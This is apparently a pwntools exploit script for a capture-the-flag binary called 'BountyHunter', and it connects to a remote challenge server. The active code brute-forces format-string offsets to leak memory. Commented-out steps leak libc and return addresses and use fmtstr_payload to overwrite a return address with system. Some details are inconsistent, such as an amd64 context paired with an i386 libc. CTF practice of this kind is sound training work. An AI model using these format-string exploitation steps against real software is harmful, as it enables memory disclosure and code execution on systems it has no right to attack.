from pwn import *
from icecream import ic

elf = exe = ELF("./BountyHunter")
libc = ELF("./libc6_2.12.1-0ubuntu10.3_i386.so")
ld = ELF("./ld-2.12.1.so")
context.arch = 'amd64'

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("pwn.1nf1n1ty.team", 32739)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def gad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def i(): return io.interactive()

io = start()

# rl()
# sl(b"%133$p")
# ru(">> ")
# libc.address = int(rl().strip(), 16) - 0x16c87
# ic(hex(libc.address))

# sl(b"%141$p")
# ru(">> ")
# return_addr = int(rl().strip(), 16) - 0x200

# payload = b'a'*24
# payload += fmtstr_payload(9, {return_addr: libc.sym['system']})
# payload = b'a'*8
# payload = b'a'*32
# payload += fmtstr_payload(10, {return_addr: 0xdeadbeef})
# sl(payload)

l = []
for i in range(1, 300):
    try:
        io = start()
        sl(f'%{i}$s')
        ru(">> ")
        data = rl()
        print("i: ", i, data)
        l.append(data)
        io.close()
    except EOFError:
        io.close()
        continue
print(l)
# ic(hex(libc.sym['system']))
# ic(hex(return_addr))
io.interactive()
